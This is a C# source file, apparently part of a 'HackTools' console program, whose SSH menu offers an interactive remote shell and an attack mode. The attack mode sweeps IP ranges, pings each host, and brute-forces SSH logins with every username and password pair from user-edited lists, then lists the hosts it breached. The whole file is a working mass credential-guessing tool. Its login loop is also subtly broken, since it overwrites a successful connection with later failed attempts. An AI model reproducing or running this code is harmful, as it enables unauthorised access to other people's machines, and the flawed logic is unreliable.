using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Linq;
using System.Net.NetworkInformation;
using System.Threading;

namespace HackTools
{
    class SSHMenu: ScreenOption
    {
        enum Options
        {
            exit,
            connect,
            attack
        }
        enum AttackOptions
        {
            exit,
            editList,
            editUsernames,
            editPasswords,
            generateRange,
            tryAccessByRange
        }
        public override void Open()
        {
            Menu<Options>.MenuItem[] items = new Menu<Options>.MenuItem[]
            {
                new Menu<Options>.MenuItem("Connect", Options.connect),
                new Menu<Options>.MenuItem("Attack", Options.attack)
            };
            Menu<Options> menu = new Menu<Options>(title: "SSH Service", items: items);
            do
            {
                Options option = menu.DisplayMenu();
                if (option == Options.exit) return;

                switch(option)
                {
                    case Options.connect: Connect(); break;
                    case Options.attack: Attack(); break;
                }
            } while (true);
        }

        public static void Connect()
        {
            string title = Console.Title;
            SSHConnection connection = new SSHConnection();
            if (!connection.ConnectWithUI()) return;
            if (!connection.Connect()) return;
            Console.Clear();
            Console.Title = $"[SSH]: Connected to {connection.ip}";
            do
            {
                string command = Console.ReadLine();
                if (command == "clear") Console.Clear();
                else if (command == "exit") break;
                else
                {
                    string result = connection.Run(command);
                    Console.WriteLine(result);
                }
            } while (true);
            Console.Title = title;
        }

        public static void Attack()
        {
            // Data
            ListGenerator<IPAndNamesList, long> targets = new ListGenerator<IPAndNamesList, long>();
            ListGenerator<PasswordsList, string> passwords = new ListGenerator<PasswordsList, string>();
            ListGenerator<UsernamesList, string> usernames = new ListGenerator<UsernamesList, string>();

            Menu<AttackOptions>.MenuItem[] items = new Menu<AttackOptions>.MenuItem[] {
                new Menu<AttackOptions>.MenuItem("Edit targets list", AttackOptions.editList),
                new Menu<AttackOptions>.MenuItem("Generate targets range (by IP)", AttackOptions.generateRange),
                new Menu<AttackOptions>.MenuItem("Edit usernames list", AttackOptions.editUsernames),
                new Menu<AttackOptions>.MenuItem("Edit passwords list", AttackOptions.editPasswords),
                new Menu<AttackOptions>.MenuItem("Try access by range", AttackOptions.tryAccessByRange)
            };
            Menu<AttackOptions> menu = new Menu<AttackOptions>(title: "Targets", items: items);
            do
            {
                AttackOptions option = menu.DisplayMenu();
                switch(option)
                {
                    case AttackOptions.editList: targets.Modify(); break;
                    case AttackOptions.generateRange: AddIPRange(); break;
                    case AttackOptions.tryAccessByRange: TryAccessByRange(); break;
                    case AttackOptions.editUsernames: usernames.Modify(); break;
                    case AttackOptions.editPasswords: passwords.Modify(); break;
                    default:
                        targets.Clear();
                        GC.Collect(); // Forces to clear memory
                        return;
                }
            } while (true);

            void AddIPRange()
            {
                Console.Clear();
                string startIp = "", endIp = "";
                do
                {
                    Printer.Print("&cyan;\nStarting IP:&white; ", newLine: false);
                    startIp = Console.ReadLine();
                    if (startIp.Length <= 0) return;
                    do
                    {
                        Printer.Print("&cyan;\nEnding IP:&white; ", newLine: false);
                        endIp = Console.ReadLine();
                        if (endIp.Length <= 0) break;
                        try
                        {
                            // Generate the range and convert it
                            targets.AddRange(
                                IPWorker.GetRangeAsLong(startIp, endIp).Select((e) => {
                                    IPAndNamesList newIp = new IPAndNamesList();
                                    newIp.SetValue(e);
                                    return newIp;
                                }).ToArray());
                            return;
                        } catch(Exception e)
                        {
                            UIComponents.Error($"Invalid IP range ({startIp} - {endIp})");
                            return;
                        }
                    } while (true);
                    Console.Clear();
                } while (true);
            }

            void TryAccessByRange()
            {
                List<SSHConnection> connections = new List<SSHConnection>();
                int current = 0;

                CancellationTokenSource cancellationToken = new CancellationTokenSource();
                Task loadingTask = Task.Run(() => {
                    LoadingUI loading = new LoadingUI("");
                    while(true)
                    {
                        if (cancellationToken.IsCancellationRequested) return;
                        loading.title = $"Trying {current}/{targets.GetItems().Count() * usernames.GetItems().Count() * passwords.GetItems().Count()}";
                        loading.Print();
                        Thread.Sleep(200);
                    }
                }, cancellationToken.Token);

                foreach(IPAndNamesList ip in targets.GetItems())
                {
                    Ping ping = new Ping();
                    PingReply reply = ping.Send(ip.GetName());
                    if (reply.Status != IPStatus.Success) continue;

                    bool connected = false;
                    SSHConnection connection = null;
                    foreach (string username in usernames.GetItems().Select((u) => u.GetValue()).ToArray())
                    {
                        foreach(string password in passwords.GetItems().Select((p) => p.GetValue()).ToArray())
                        {
                            connection = new SSHConnection(username, password, ip.GetName());
                            if (connection.Connect()) connected = true;
                        }
                        if (connected) break;
                    }

                    if (connected && connection != null) connections.Add(connection);
                }

                cancellationToken.Cancel();
                cancellationToken.Dispose();
                Menu<SSHConnection> menu = new Menu<SSHConnection>(title: "Successful connections", items: connections.Select((c) => new Menu<SSHConnection>.MenuItem(c.ip,c)).ToArray());
                if(connections.Count <= 0)
                {
                    Console.Clear();

                    Printer.Print("&red;The program was unable to connect to any device via SSH (using the specified targets, usernames and passwords)");

                    UIComponents.PressAnyKey();
                    return;
                }
                do
                {
                    SSHConnection connection = menu.DisplayMenu();
                    if(connection == null)
                    {
                        Printer.Print("&cyan; [?] Are you sure you want to exit?");
                        if (UIComponents.GetYesNo()) return;
                    }
                } while (true);
            }
        }
    }
}